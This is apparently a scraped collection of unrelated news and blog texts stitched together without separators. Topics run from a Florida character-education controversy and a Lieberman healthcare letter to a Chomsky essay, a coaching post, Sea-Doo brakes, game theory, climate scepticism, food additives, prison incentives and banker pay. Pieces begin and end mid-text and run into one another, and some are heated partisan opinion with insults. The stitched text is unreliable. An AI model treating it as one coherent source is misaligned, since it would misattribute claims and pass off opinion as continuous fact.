In 1999 , Forman persuaded then - state Sen. Howard Forman ( no relation to Hamilton ) and Rep. Tracy Stafford , both Broward Democrats , to sponsor bills mandating that all Florida schools teach Character First !
or a program similar to it .
As it happened , Hamilton Forman told me about Character First ! in 1999 , and I investigated Gothard , who basically had kept his name separate from the curriculum .
I attended an IBLP seminar in Titusville where videotapes of a preaching Gothard were shown , and I visited Hamilton Forman 's Charter School of Excellence , where the children marched in a courtyard and shouted about following orders instantly .
When my story was published , the American Jewish Congress , teachers unions , and political groups raised hell , and both Forman and Stafford struck Character First ! from their bills .
Stafford , who is no longer in office , said he was concerned that such teachings would keep battered children from reporting abuse .
Just this past week , however , I discovered that Character First ! was added back into the legislation by a late - filed amendment .
Howard Forman , now Broward clerk of courts , says he never realized his bill was changed .
" It was my intent to get Character First ! out of there , " he says .
" They gave it the old slip . "
Documents from the Florida Legislative Law Library show that the bill survived two committees without inclusion of Character First !
but that the program was added on the House floor by a Democratic legislator from Tallahassee named Al Lawson .
He , however , says he knows nothing about Character First ! , never filed such an amendment , and does n't believe in character education in public schools .
I 'm still determined to get to the bottom of this , but the end - all is that Florida has become Gothard country .
For all Gov. Bush 's talk about stopping big government , this mandate will cost school systems tens of millions of dollars .
Under current law , every school in the state must implement either Character First !
or a program similar to it by the 2004 - 05 school year for every grade from K to 12 .
The Broward controversy has followed Character First ! to cities across the country .
Citizens have fought the curriculum in numerous states , from North Carolina to Michigan to Washington , sometimes successfully .
The fight is now being waged in West Palm Beach , where an activist named Jay Bonner persuaded the school district to approve Character First !
Regier 's beloved ITC , meanwhile , is still besieged by criticism .
Gothard publicly promised to end the policy of corporal punishment there , but that has n't stopped Indianapolis City Councilman Steve Talley from trying to shut down the center -- or at least cut its ties with the court system .
He says he has met with the parents of four youths who have complained of being abused at ITC .
They showed him photographs of bruises inflicted by staffers and told horror stories about the prayer closet .
" If it was possible for me to close it down today , I would do that , " says Talley , who has served seven years on the council and describes himself as a conservative Democrat and devout Christian .
" There are too many questions about their methods and discipline .
They lock kids up in a room and force them to pray .
There is definitely a break in the separation of church and state there .
This is way over the line . "
He says several of the 29 council members agree with him , just not quite the majority .
Another roadblock to stopping Gothard , he says , is that the chairman of the city 's criminal justice committee is an IBLP devotee .
" People just do n't see it as a priority , " Talley complains .
" But it is our highest priority .
It 's our children . "
Talley says he 's concerned not only about Gothard 's programs ' being spread around the country but also about Goldsmith 's sitting in the White House .
" It scares me to death ; it really does , " he says .
" It frightens me .
I 've seen what he 's done in Indianapolis . "
The fact that the Bushes are tied to a neo - fascist like Gothard should n't really be surprising .
Both the president and governor pretend to be moderates , but they surround themselves with right - wing ideologues .
And when it comes to radical agendas , a little more national obedience could n't hurt , especially when it comes to the planned attack on Iraq .
And though the invasion , without further justification , may seem like an unprecedented act of naked aggression , the order is coming from the highest authority on Earth , so who are we to question it ?
As Gothard will tell you , George W. Bush is a representative of Jesus Christ himself .
Hut two three .
Hartford - Invoking a fundamental moral principle of Judaism , more than two dozen Connecticut rabbis have written to urge U.S. Sen.
Joe Lieberman , D - Conn. , to reconsider his position on health care reform .
" I think the basic message is that taking care of those in need is really one of the basic tenets and principles of the Jewish religion , " said Rabbi Carl Astor of Congregation Beth El in New London .
" That 's what we 've been taught since childhood .
And he's an observant Jew .
He 's got to make a decision as a United States senator , but there are just certain values that transcend politics , and we thought in this case maybe , as rabbis , it would be good to remind him of that . "
Astor was one of 29 rabbis who signed the letter , which says , in part , " As rabbis and Jews , we are commanded to seek the welfare and healing of all those in our midst , especially the weak , especially the vulnerable .
We are taught to care for justice - and a system that leaves millions of Americans uninsured and under - insured is far from just . "
It is an appeal aimed at the heart of a man who is known for being devout in the observance of his faith .
Lieberman earned national headlines just last weekend , walking miles through the blustery cold to cast a vote during a rare Saturday session , since he does not use a car on the Sabbath .
The senator would not comment personally on the letter Thursday , but his staff issued a written statement saying that Lieberman , a registered Democrat who has been at loggerheads with his party on health care reform , is seeking to broaden coverage but wary of the costs .
" Senator Lieberman shares many of the concerns in the letter and believes that we should pass a health care bill as soon as possible that will provide health insurance coverage to millions of Americans who lack it and do so in a way that will not create more hardship for the people of Connecticut and America who are suffering under a weak economy , " said Lieberman 's communications director , Marshall Wittmann .
The rabbis ' letter , dated Dec. 7 , was originally drafted in an effort to urge Lieberman to drop his threat to help filibuster any bill that contains a public insurance option to compete with private plans , said Rabbi Charles Arian of Congregation Beth Jacob in Norwich , another co-signer .
Lieberman " really threatened to scuttle the whole thing because of his disagreement with certain things .
...
And I think that 's what 's really been upsetting . "
In the letter , the rabbis say they respect Lieberman 's opposition to the public option and other measures in the bill , but ask him " in the strongest terms not to stand in the way of a vote on health care reform " by supporting Republican efforts to block a vote on the measure .
Noting Lieberman 's 1994 remarks in opposition to the use of " holds " and procedural filibusters to block votes in the Senate , the rabbis wrote , " You were right then .
Senator Lieberman , please do not prevent millions of Americans from getting the health care they need through use of a tool which you yourself have criticized as unfair and undemocratic . "
And while Lieberman has in recent days convinced Democratic leaders to drop their plans for a public option or an expansion of Medicare for the uninsured , some signatories of the letter say Lieberman should rethink his opposition to those measures , in part because of Jewish teachings on the importance of caring for the weak and needy .
" I think our feeling is very strongly that there should be ( a public option ) , that this is a matter of social justice , " Astor said .
" And without it the bill sort of lacks teeth .
It says the idea is to bring costs down and cover more people .
That 's nice to think about , but it's not workable unless there is some competitive public option , especially for low - income people and the uninsured . "
While some members of his congregation oppose the public option , Astor said , most support it .
" I think by and large , from what I can sense , people are very disappointed with him , very disappointed , " the rabbi said .
" I cringe that our senator should be the one that 's blocking this at this time .
It really disturbs me . "
Arian contrasted the effort to change Lieberman 's mind to other recent clashes between religious leaders and the politicians among the faithful , like the recent dispute between Rep. Patrick Kennedy , D - R.I. , who has said he was refused Communion by Roman Catholic officials over his support for abortion rights .
" I certainly do n't think that just because a religious group polls a certain way that every member of that religious group that holds a public office is required to vote that way , " Arian said .
" We believe it is an obligation to care for the sick , and it is an obligation of the community to provide for its members , " he added .
" Most Jewish groups that have taken a position on this issue have said American society has an obligation to take care of those who are sick .
And I 'm sure Senator Lieberman would agree with that . "
The rabbis were not confident they could get Lieberman to reverse himself , or to help restore the public option now that the language has been dropped from the Senate version of the bill .
" He 's dead set against it , " Astor said , " and he 'll probably succeed in killing it , which I think is a tragedy . "

War , Peace , and Obama ’s Nobel
Noam Chomsky
In These Times , November 5 , 2009
The hopes and prospects for peace are n’t well aligned — not even close .
The task is to bring them nearer .
Presumably that was the intent of the Nobel Peace Prize committee in choosing President Barack Obama .
The prize “ seemed a kind of prayer and encouragement by the Nobel committee for future endeavor and more consensual American leadership , ” Steven Erlanger and Sheryl Gay Stolberg wrote in The New York Times .
The nature of the Bush - Obama transition bears directly on the likelihood that the prayers and encouragement might lead to progress .
The Nobel committee ’s concerns were valid .
They singled out Obama ’s rhetoric on reducing nuclear weapons .
Right now Iran ’s nuclear ambitions dominate the headlines .
The warnings are that Iran may be concealing something from the International Atomic Energy Agency and violating U.N. Security Council Resolution 1887 , passed last month and hailed as a victory for Obama ’s efforts to contain Iran .
Meanwhile , a debate continues on whether Obama ’s recent decision to reconfigure missile - defense systems in Europe is a capitulation to the Russians or a pragmatic step to defend the West from Iranian nuclear attack .
Silence is often more eloquent than loud clamor , so let us attend to what is unspoken .
Amid the furor over Iranian duplicity , the IAEA passed a resolution calling on Israel to join the Nuclear Non-Proliferation Treaty and open its nuclear facilities to inspection .
The United States and Europe tried to block the IAEA resolution , but it passed anyway .
The media virtually ignored the event .
The United States assured Israel that it would support Israel ’s rejection of the resolution — reaffirming a secret understanding that has allowed Israel to maintain a nuclear arsenal closed to international inspections , according to officials familiar with the arrangements .
Again , the media were silent .
Indian officials greeted U.N. Resolution 1887 by announcing that India “ can now build nuclear weapons with the same destructive power as those in the arsenals of the world ’s major nuclear powers , ” the Financial Times reported .
Both India and Pakistan are expanding their nuclear weapons programs .
They have twice come dangerously close to nuclear war , and the problems that almost ignited this catastrophe are very much alive .
Obama greeted Resolution 1887 differently .
The day before he was awarded the Nobel Prize for his inspiring commitment to peace , the Pentagon announced it was accelerating delivery of the most lethal non-nuclear weapons in the arsenal : 13 - ton bombs for B - 2 and B - 52 stealth bombers , designed to destroy deeply hidden bunkers shielded by 10,000 pounds of reinforced concrete .
It ’s no secret the bunker busters could be deployed against Iran .
Planning for these “ massive ordnance penetrators ” began in the Bush years but languished until Obama called for developing them rapidly when he came into office .
Passed unanimously , Resolution 1887 calls for the end of threats of force and for all countries to join the NPT , as Iran did long ago .
NPT non-signers are India , Israel and Pakistan , all of which developed nuclear weapons with U.S. help , in violation of the NPT .
Iran has n’t invaded another country for hundreds of years — unlike the United States , Israel and India ( which occupies Kashmir , brutally ) .
The threat from Iran is minuscule .
If Iran had nuclear weapons and delivery systems and prepared to use them , the country would be vaporized .
To believe Iran would use nuclear weapons to attack Israel , or anyone , “ amounts to assuming that Iran ’s leaders are insane ” and that they look forward to being reduced to “ radioactive dust , ” strategic analyst Leonard Weiss observes , adding that Israel ’s missile - carrying submarines are “ virtually impervious to preemptive military attack , ” not to speak of the immense U.S. arsenal .
In naval maneuvers in July , Israel sent its Dolphin class subs , capable of carrying nuclear missiles , through the Suez Canal and into the Red Sea , sometimes accompanied by warships , to a position from which they could attack Iran — as they have a “ sovereign right ” to do , according to U.S. Vice President Joe Biden .
Not for the first time , what is veiled in silence would receive front - page headlines in societies that valued their freedom and were concerned with the fate of the world .
The Iranian regime is harsh and repressive , and no humane person wants Iran — or anyone else — to have nuclear weapons .
But a little honesty would not hurt in addressing these problems .
The Nobel Peace Prize , of course , is not concerned solely with reducing the threat of terminal nuclear war , but rather with war generally , and the preparation for war .
In this regard , the selection of Obama raised eyebrows , not least in Iran , surrounded by U.S. occupying armies .
On Iran ’s borders in Afghanistan and in Pakistan , Obama has escalated Bush ’s war and is likely to proceed on that course , perhaps sharply .
Obama has made clear that the United States intends to retain a long - term major presence in the region .
That much is signaled by the huge city - within - a city called “ the Baghdad Embassy , ” unlike any embassy in the world .
Obama has announced the construction of mega-embassies in Islamabad and Kabul , and huge consulates in Peshawar and elsewhere .
Nonpartisan budget and security monitors report in Government Executive that the “ administration ’s request for $ 538 billion for the Defense Department in fiscal 2010 and its stated intention to maintain a high level of funding in the coming years put the president on track to spend more on defense , in real dollars , than any other president has in one term of office since World War II .
And that ’s not counting the additional $ 130 billion the administration is requesting to fund the wars in Iraq and Afghanistan next year , with even more war spending slated for future years . ”
The Nobel Peace Prize committee might well have made truly worthy choices , prominent among them the remarkable Afghan activist Malalai Joya .
This brave woman survived the Russians , and then the radical Islamists whose brutality was so extreme that the population welcomed the Taliban .
Joya has withstood the Taliban and now the return of the warlords under the Karzai government .
Throughout , Joya worked effectively for human rights , particularly for women ; she was elected to parliament and then expelled when she continued to denounce warlord atrocities .
She now lives underground under heavy protection , but she continues the struggle , in word and deed .
By such actions , repeated everywhere as best we can , the prospects for peace edge closer to hopes .
Remember Robin Hood ’s fan club from the 1973 Disney animated movie — those three little rabbit siblings and their friend , Toby the Turtle ?
As a refresher , he ’s the super nervous and anxious one who can be found often hiding in and talking from the comfort of his own shell .
You know the one ( he ’s pictured above ) .
Turns out ,
Toby very conveniently encompasses what I call “ turtling . ”
Turtling describes the process people go through to hide and feel secure .
No one ’s immune ; we all turtle in different ways .
The challenge , though , especially when you ’re a coach , is figuring out whether the turtling is instrumental or detrimental .
It ’s a tricky process because coaches sometimes have to make people uncomfortable in order to grow .
I call the discomfort “ creative tension . ”
It ’s never particularly comfortable , but it ’s where positive change begins to happen .
And yet , if you make people too uncomfortable , they turtle and start resisting you and their own growth .
When Turtling Is a Coping Mechanism
Some people turtle as a coping mechanism .
They get overwhelmed by a career change , a new baby , et cetera , but they do n’t engage with those things or tell anyone how they ’re feeling .
Instead , they shut everyone and everything off .
Working with people when their turtling as a coping mechanism is precarious because it ’s hard to tell if your conversations are going to be the additional straw that breaks their back or the one that lifts a whole heap of hay off of them .
If you poke at them in the wrong way when they ’re turtling , they just ignore you until something breaks .
But if they ’re not saying they ’re overwhelmed , you do n’t know they need a helping hand rather than a prod .
When Turtling Is for Processing and Planning
In other cases , people turtle for healthy reasons .
They use it to ( 1 ) process what they ’re feeling and ( 2 ) figure out what to do next .
These people are n’t scared or overwhelmed .
Rather , they ’re turtling , plotting , and preparing to run like hell when they ’re ready .
You have to let these people do their thing .
If you do n’t , they ’ll never move .
Be ready , though :
These types of turtles often run blind .
They need a coach to keep them aware of their surroundings and on the right course .
( This is my pattern , in case you ’re curious . )
When Turtling Is for ( Everyone ’s ) Emotional Health
Sometimes , you have to recommend people turtle so that they do n’t do or say things they ’ll later regret .
This is especially true of people who wear their heart on their sleeves .
Their emotions can be too intense for some people , so they have to be taught to “ play it cool . ”
They might resent you for it ; in fact , they probably will .
Even though you ’re saying “ not here and not now , ” they hear “ not ever . ”
That can make them defensive , but do n’t give up .
They need to learn to control their initial impulses — you and I both know their propensity for emotional unloading on other people will only make matters worse and possibly lead to fractured relationships , unforgiveness , and bitterness .
They need to turtle so that they can consider how their words and actions affect others .
Turtling is neither good nor bad , and we all need to do it sometimes .
( Tweet this . )
The question is not whether you ’re turtling .
You have , are , or will at some point .
The question is whether your turtling helps or hinders your growth .
If you ’re too secure and comfortable , you ’re not growing in the ways you could .
You ’ve settled into your shell , and it ’s time to put your head back out .
However , if you ’re not taking time to process and integrate experiences — or to give people space away from your emotional intensity — you ’re also not growing as much as you could .
How do you turtle ?
Can you tell when it ’s instrumental or detrimental ?
If you know that your turtling is detrimental , do you know how to come out of your shell ?

Rocketing along the water at 60 mph in a personal watercraft ( PWC ) is a lot of fun , but it 's not traditionally the safest pastime .
PWCs make up less than 10 percent of recreational boats yet account for 24 percent of all accidents , in large part because they have no brakes and cannot be steered when the throttle is released .
After eight years of research and development aimed at reversing those gloomy statistics , Sea-Doo finally unveiled the GTX Limited iS 255 , the first PWC with on - water braking .
Conventional PWCs merely slow to a stop after you let go of the throttle , but when a rider squeezes the Sea - Doo 's bicycle - like hand brake , a computer cuts the power so the forward jet quickly stops thrusting .
Calculating the precise amount of thrust needed to counter the forward momentum , the computer also drops an aluminum gate up to two inches below the hull , creating drag and reversing the thrust to slow the craft down .
This complex orchestration can bring a Sea - Doo traveling at 50 mph to a dead stop in about 100 feet — half the distance of a brakeless PWC .
But this is n't just the safest PWC on the water ; it may also be the most comfortable .
A unique gas - shock - equipped full suspension — another PWC first — swallows choppy water and can be adjusted on the fly for either a stiffer , performance - oriented ride or a cushy cruise .
Look for the braking system and full suspension in three additional Sea - Doo models for 2010 , including the newly upgraded 260 - horsepower GTX Limited iS 260 , and for the braking system alone in four other models .
See more images , and a video , of the Sea - Doo GTX Limited iS 255 at the Best of What 's New 2009 site .
HELLO AGAIN .
Since my first post was on the subject of Thanksgiving , I put off the general introduction to my blog until now .
As you may remember , I promised that I would eventually get around to some of the obvious questions , such as " why am I breaking the silence now , after all this time ? " and " why am I doing it on an atheist site ? "
I 'm going to at least begin to keep that promise in this post , and I think I 'll start with the second , and probably more controversial , question .
There are several reasons why I picked an atheist site for these posts , and I 'll take them one at a time .
The first and probably least important reason is that I am an atheist .
Sounds paradoxical , does n't it ?
In spite of the fact that I have an inflated reputation for paradox , I assure you that this is really not one at all .
It 's more a matter of semantics .
When people talk about " believing in God , " say in a debate setting for example , they often speak as though they are talking about some unknown quantity out there somewhere , beyond human imagining .
That 's all fine — sound theology , really — if that 's what they really mean .
But it is n't .
99 % of the time , when someone says they " believe in God , " they really mean some picture they have in their head , which is based on stuff they learned from their religion or their parents or grandparents , or just picked up from living in a religion - soaked culture .
Many times their church will even tell them that this picture is really nothing like the real God , but that does n't stop them from meaning that picture when they use the word .
So , when people talk about " believing in God " they are really talking about believing in a picture : usually a picture of Jesus , or an ancient Mideastern king , or George Burns .
And , along with the picture goes a whole list of ideas about what that " God " likes or wants , what he ( almost always " he " ) disapproves of , and how he works — also mostly picked up from religions , popular culture , and George Burns movies .
Well , except for the George Burns part , I 'm nothing like most of that stuff .
It has its cultural purposes , but from a scientific point of view , it 's all nonsense .
I could give you a list of the ways , but for the moment I 'll just leave it at that .
The point is that , in terms of real everyday language " belief in God " means belief in all of that nonsense , and , of course , I do n't .
On the other hand , atheists , for the most part do n't mean that there is no such thing a ground of all being .
Many of them are scientists , even physicists , who spend much of their time trying to delve into the ground of being .
They do n't necessarily call it that , but that 's what they 're doing .
Kind of flattering , really .
The scientists agree with the believers on one point — on the meaning of that phrase " believe in God . "
That is , they mean pretty much the same set of nonsense by the word " God , " only they do n't believe it exists .
Just like me .
So , based on the definition used in normal language , as agreed upon by all parties except for a very small handful of theologians — who will just have to learn to live with it — I am an atheist .
I 'll explain some of the other reasons in a future post .
Meanwhile , if you have any questions , please leave them in the comments section below , and I 'll try to answer as many as I can .
Sincerely ,
The Ground of All Being
With 2010 now less than a month away , your friends here at Film Junk have decided to look back over the past decade in film , to separate the wheat from the chaff , and consider how it has all tied in with the rest of our cultural experience .
To deduce our Top 20 Films of the Decade , Greg , Jay , Goon and I each came up with our own personal lists of favourite films , and then found as many as we could in common .
From here , we re-ranked this new list to arrive at a final tally .
Over the next month , we will be revealing a new pick from this list every weekday , ending with # 1 sometime just after Christmas .
At that point we will also post our individual lists , and possibly also record a special podcast discussing the decade in review .
The list below will be updated as each entry appears on the site , and will serve as the master list when all is said and done .
Keep checking back daily to follow the countdown !

Check out our individual Top 50 lists , which were roughly used to create the Top 20 .
You are in a game show with nineteen other players .
You do n't know the other players , you can't see them , and you can't communicate with them .
The game you are in is called ' Greed ! ' , and is straightforward to explain .
You are asked to write down a whole dollar amount in the range $ 1 - $ 1,000,000 on a piece of paper .
You will be paid the amount you asked for if it is deemed to be ' non - greedy ' .
Whether your request is indeed ' non - greedy ' will be decided once all twenty request have been received by the host of the show .
Your requested amount will be labeled ' non - greedy ' if no other player has asked for less , and at least one player has asked for more .
How do you play ?
This is your chance to go home with a life - changing sum of money .
But ... you have to balance your greed with the risk of getting underbid .
You better think this through carefully .
Let 's assume you go for the maximum .
Well , that is not really a rational move , is n't it ?
No -one can overbid you , so your bid can impossibly be classified as ' non- greedy ' .
No matter what the others do , you are guaranteed to go home empty - handed .
So let 's avoid this suckers strategy and ask for one dollar less : $ 999,999 .
That will win you a handsome amount if no - one underbids you , and at least one person asks for more .
But how likely is such an outcome ?
Surely the other players will have reached insights similar to yours .
And if all other players draw the same conclusions as you do , no - one will have written down a higher amount .
So either all other players ask for the same amount as you do , or one or more players underbid you .
In both cases you go home empty - handed .
Apparently , you have to bid less than $ 999,999 .
And again , when making this downward adjustment , you can not prevent your competitors from following the same logic .
We see a pattern emerging .
Continuing this iterative line of reasoning will take you and your competitors in free fall towards the strategy of requesting the smallest permissible amount : $ 1 .
This is the outcome predicted by game theory : the game ' Greed ! ' forces rational players towards a strategy of requesting the smallest amount .
If all players follow this logic , they all end up writing down an amount of $ 1 , and all of them go home empty - handed .
Yet , no player can do better by deviating single - handedly from this strategy : selecting any higher amount will not yield a better return if the other players stick to their choice of $ 1 .
In game - theory jargon , such a strategy combination for which none of the players feels an incentive to deviate , is referred to as a Nash equilibrium .
So what do you do ?
Will you indeed write down the amount $ 1 ?
I doubt it .
The game ' Greed ! ' relies on deep iterative reasoning to demonstrate the Nash equilibrium .
Other games with these characteristics such as the game Guess 2/3 of the average and Traveler 's dilemma invariably lead to experimental results that deviate markedly from the game - theoretical ( Nash equilibrium ) predictions .
Some researchers argue that the failure of standard game theory to reproduce experimental outcomes for such games necessitate a re-definition of what constitutes rational behavior .
Kaushik Basu , inventor of the game ' Traveler 's dilemma ' , writes in Scientific American :
“ When playing [ traveler 's dilemma ] , people consistently reject the rational choice .
In fact , by acting illogically , they end up reaping a larger reward -- an outcome that demands a new kind of formal reasoning . ”
and :
“ The [ Traveller 's dilemma ] highlights a logical paradox of rationality [..]
This paradox has led some to question the value of game theory in general , while others have suggested that a new kind of reasoning is required to understand how it can be quite rational ultimately to make non-rational choices . ”
Douglas Hofstadter , in his book " Metamagical Themas " argues that humans have the potential to transcend game - theoretical rationality and can act ' superrationally ' .
Such remarks ignore the fact that the concept ' Nash equilibrium strategy ' is not necessarily synonymous to ' optimal play ' .
A Nash equilibrium can define an optimum , but only as a defensive strategy against stiff competition .
More specifically : Nash equilibria are hardly ever maximally exploitive .
A Nash equilibrium strategy guards against any possible competition including the fiercest , and thereby tends to fail taking advantage of sub - optimum strategies followed by competitors .
Achieving maximally exploitive play generally requires deviating from the Nash strategy , and allowing for defensive leaks in ones own strategy .
Poker players know this all too well .
Nash equilibrium strategies are the optimal strategies – and a perfectly rational choice - against the strongest competition .
Yet , against weaker competition , deviating from Nash equilibrium strategies becomes a perfectly rational choice .
There is absolutely no ' logical paradox ' hidden in these facts .
So how you should play the game ' Greed ! ' ?
This depends very much on your perception who you are competing with .
Without any information on the group of opponents , you assume randomly selected competitors , and make model assumptions on their capability to iterate towards the Nash equilibrium .
Behavioral studies on games like Guess 2/3 of the average suggest that significant fractions of randomly selected candidates fail to iterate more than one step .
In the game ' Greed ! ' this forces you to a rational choice of selecting amounts well above the Nash equilibrium value of $ 1 .
However , if you know that a large fraction of your competitors are game theoreticians , mathematicians and others with likely full insight into the theoretical and strategic aspects of the game , you better adopt your choice to a value closer to the Nash value of $ 1 .
Note that even under these circumstances it is not necessarily rational to select the precise Nash value .
For the Nash strategy to be optimum , your opponents not only need to be optimally skilled at the game , they also need to be convinced that all their competitors are equally skilled players who know they are playing against optimally skilled opponents ... etc .
A circumstance that is seldomly true in many - player games .

I am going to violate my own rule for one post .
I council everyone I know not to get pulled into the absolutely pointless activity of engaging in dueling headcounts of scientists in the climate debate .
This has zero utility , and means virtually nothing .
Science is not settled like a football game , or an election .
But since I keep getting the “ 2500 ” scientists number thrown at me by alarmists , I am starting to believe the number is closer to 25 , not 2500 .
Sure there are many folks who have participated in work that has become a part of the IPCC , but it is old news that though those folks are counted as believers , many reject key aspects of the IPCC findings .
It is becoming increasingly clear than when people talk about the consensus , it is a position being espoused and communicated and driven by a handful of folks over and over in different outlets .
The same folks were advisors on Gore ’s movie and run Realclimate and are advisors of the President and were leaders of the IPCC process and were featured in many of the CRU emails .
Myron Ebell has an interesting article on this :
But when asked about some of his own extreme statements and predictions , Holdren replied that scientific research had moved on from the latest UN assessment report in 2007 .
The most up - to - date scientific research was contained in a report written by some of the world ’s leading climate scientists and released last summer .
Holdren mentioned and referred to this report , Copenhagen Diagnosis , several times during the course of the hearing ….
I ’m sure it will come as a shock that the two groups largely overlap .
The “ small group of scientists ” up to their necks in Climategate include 12 of the 26 esteemed scientists who wrote the Copenhagen Diagnosis .
Who would have ever guessed that forty - six percent of the authors of Copenhagen Diagnosis belong to the Climategate gang ?
Small world , is n’t it ?
The existence of this small core does nothing to prove or disprove catastrophic anthropogenic global warming .
The same statement about , say , string theory could be made about thousands of scientists working around the margin of the problem but a handful driving the train .
But it does mean that the CRU email scandal is not an irrelevant sideshow involving less than 1 % of the climate community — it is a window on poor scientific profess engaged in by a group that makes up perhaps a third or half of the core driving the “ consensus ” .
Which makes it a big deal .
Ottawa is asking Canadians if they think a cancer - fighting enzyme should be added to junk food .
Putting the enzyme asparaginase in baked and fried food is a " high priority " for Health Canada , the government said Tuesday in calling for comments .
Canada is following the lead of Singapore , the Netherlands , Australia , New Zealand , Switzerland , Denmark , Mexico and Russia .
Companies such as McCain's and Frito Lay are urging Ottawa to approve the food additive and any other substance that cuts down on the levels in processed food , junk food , bread and cereal of a probable carcinogen .
A joint study by the U.N. Food and Agriculture Organization and the World Health Organization approved adding the enzyme asparaginase to potato chips , French fries and packaged cookies in 2005 .
A Swedish study in 2002 had set off alarms among consumers and the food industry worldwide when it discovered high levels of what was considered a probable carcinogen , acrylamide , formed in some food after high - temperature frying or baking .
Denmark moved first to include it , followed by the U.S. and , in May 2008 , Australia and New Zealand .
China gave the additive regulatory approval in October .
Canada started the long process of changing government regulations to allow the food additive nearly a year ago , when the government asked the opinions of food industry groups including the Baking Association of Canada , McCain Foods and Frito Lay Canada .
Asparaginase got a thumbs - up from all of them , Health Canada said , and they asked the government to " treat the approval of all tools with the potential of reducing acrylamide formation in food as a high priority , " the government says on its website .
The enzyme reduces the levels of L - asparagine , a precursor of acrylamide , which forms in starchy food that is baked or fried at temperatures above 120 C : bread , crackers , cookies , French fries and potato chips are examples .
Danish tests , cited by Food Standards Australia New Zealand , said the formation of acrylamide dropped by 36 to 75 per cent in bread and by 86 to 92 per cent in fritters , doughnuts , Dutch honey cake and crackers .
The European Food and Drink Federation , a food industry lobby , has been offering asparaginase information pamphlets for several years , with the latest updates in February 2009 , incorporating U.S. food industry standards .
" Use of asparaginase is effective in biscuits , cereals , crisp bread , and is today applied to commercial products ( e.g. gingerbread , crispbread , short sweet biscuits , RTE cereals , certain cereal - based snacks ) with potential also in other biscuit and cereal product types , " the pamphlets say .

Anti-food additive organizations have argued other means can also neutralize the damage of the carcinogen .
Kit Granby , a senior scientist at the National Food Institute , Technical University of Denmark , has reported on studies that found the herb rosemary is also effective in reducing acrylamide content in food by up to 60 per cent .

No , seriously , economists sometimes really do have very good ideas , ideas that can improve society , change lives and save money .
Sometimes the wisdom of the idea is so obvious , you wonder why it took an economist to think of it .
Try this :
The people and corporations running our prisons should be paid in proportion to the number of their inmates who do n't re-offend .
That could turn prisons into rehabilitation centres instead of schools for crime , slash recidivism rates and reduce considerable direct and indirect costs of crime - everything from insurance claims to police , courts and victims ' expenses , not to mention the very costly business of keeping people in choky and the tendency of prisoners ' and their families to be more frequent social welfare customers .
This suggestion , tucked away in the and the blog last week and deserving wider consideration , came from Andrew Leigh , an economist with the Australian National University 's Research School of Social Sciences .
According to Leigh , nearly 50 per cent of the 20,000 or so prisoners shown the door this year will end up back inside within two years .
Get the profit motive to work though and that could be dramatically altered , particularly if more than the present 16 per cent of inmates were held in appropriately incentivised privately - run jails .
Centrists have said they will not vote for a healthcare reform bill that imposes a tax surcharge on the nation 's highest income earners or reduces the tax burden on so - called Cadillac health insurance plans , which are held by many unionized workers .
Sens. Mary Landrieu ( D - La. ) , Blanche Lincoln ( D - Ark. ) and Ben Nelson ( D - Neb. ) have made clear there is little room to deviate from the bill the Senate passed on Christmas Eve .
The Conservadem Senators are vowing to kill the bill unless House Democrats f.ck labor and roll over on all major issues :
Landrieu says FU to union workers :
" I can only support a bill if the Cadillac plans are taxed at the level they are in the Senate [ bill , ] " said Landrieu .
" It 's not because I 'm thrilled about taxing those plans , which I 'm not , but it is the No. 1 cost - containment measure in the bill .
It 's what is going to drive costs down over time . "
The HIll : Centrists set strict guidelines for Senate - House healthcare talks
And Lincoln demands that the House not make any real improvements :
Lincoln also said she has great concern .
" If it moves very much at all from where we are , it 's going to be hard , " she said .
The HIll : Centrists set strict guidelines for Senate - House healthcare talks
That 's the Merry Christmas from the Gang of 3 , and we know Lieberscum will join them .
One thing I know is that I will do all I can to defeat Blanche Lincoln 's reelection .
ALL .
That is My Number 1 Political Priority in 2012 .
And I think the AFL - CIO and SEIU will be helping .
Until we make examples , these people will f.ck working people with impunity .
Here 's how to start defeating Lincoln :

We live in an accelerated , information - saturated society that often discourages sustained engagement with many traditional forms of writing .
Mass media , digital culture and stunning advances in communications technology together represent unprecedented opportunities in terms of how ideas circulate within technologically advanced societies .
But these same forces also pose formidable challenges for those worried about the future of reading .
These are not theoretical concerns .
In his bracing 2008 report on the state of Canadian literacy , TD Bank deputy chief economist Craig Alexander lays out compelling evidence to suggest that Canadians should n’t be complacent about generally positive standardized test scores and news of Canada ’s standing on international academic rankings .
Probing deeper , Mr. Alexander finds much to indicate that all is not well .
Four in ten youth lack adequate literacy skills .
Stubborn regional disparities persist .
Boys lag behind girls .
Poverty affects learning .
As for adults , among Canadians between 16 and 65 , almost half struggle with literacy , often due to linguistic barriers among new immigrants .
Many countries around the world have developed national programs to promote reading among children and the general population .
In Canada , individual provinces and communities have made steps in this direction ; however , because schools and libraries are the most obvious focus for public reading initiatives , and both are under provincial and municipal jurisdictions , we have no coordinated national strategy to promote reading .
The ultimate goal of a national strategy would be to promote reading among all Canadians , reflecting the value of reading as a tool for democracy and civic engagement , a means to equalize the playing field for all Canadians , a way for Canadians to learn about themselves , and a vehicle for joy .
How bankers destroy £ 7 for every £ 1 they create : Hospital cleaners are more valuable to society , say researchers
Bankers may be good at making money for themselves - and sometimes for their banks - but they are a drain on society , a study has found .
It says they effectively take £ 7 from the rest of us for every £ 1 they create .
Lowly - paid employees such as hospital cleaners and waste recycling workers are far more valuable according to the New Economics Foundation thinktank .
Undervalued : Hospital cleaners are more valuable to us than bankers , a new study claims
It rated different jobs on how much they help or hinder society through the social , economic and environmental effects of the work .
The researchers said the traditional view of bankers creating wealth which trickles down to others is no longer correct .
Instead , the actions of high - earning investment bankers have had ' damaging social effects ' .
They helped bring the global financial system to the brink of collapse - causing jobs to be lost rather than created and increasing the public debt .
One of the top - paid bankers is Barclays president Bob Diamond , 58 , who received more than £ 20 million a year at the height of the banking boom .
Wealthy : Bob Diamond earned more than £ 20 million a year at one point
The report says advertising executives and tax accountants destroy even more of society 's wealth as they create their own .
Childcare workers , by contrast , free up potential wealth by helping parents keep working - generating up to £ 9.50 for every pound they are paid .
Waste recycling workers help promote recycling , reducing carbon emissions and the amount of goods being thrown into landfill .
This helps society now and in the future - so they generate £ 12 for every pound .
The foundation said there needs to be a ' fundamental rethink ' of how people are paid .
Its report , A Bit Rich ? , said : ' We found that some of the most highly - paid benefit us least , and some of the lowest - paid benefit us most .
' Although this will not always hold , it points to a massive flaw in the system and highlights the need for reform . '
Using investment bankers as an example , it said : ' Far from being " wealth creators " , City bankers are being handsomely rewarded for socially - damaging activity .
' They are not just overpaid ; they are overpaid at the expense of others . '
